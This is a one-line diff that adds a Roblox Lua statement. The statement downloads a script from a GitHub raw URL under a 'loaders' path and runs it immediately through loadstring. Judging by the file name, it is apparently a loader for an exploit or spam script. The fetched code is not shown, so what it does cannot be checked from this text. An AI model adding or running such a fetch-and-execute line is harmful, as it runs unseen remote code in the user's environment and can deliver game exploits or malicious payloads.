@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ShinobiComply/loaders/main/loaders/wanted-update-spam5-pdazvu8umclmhz.lua"))()
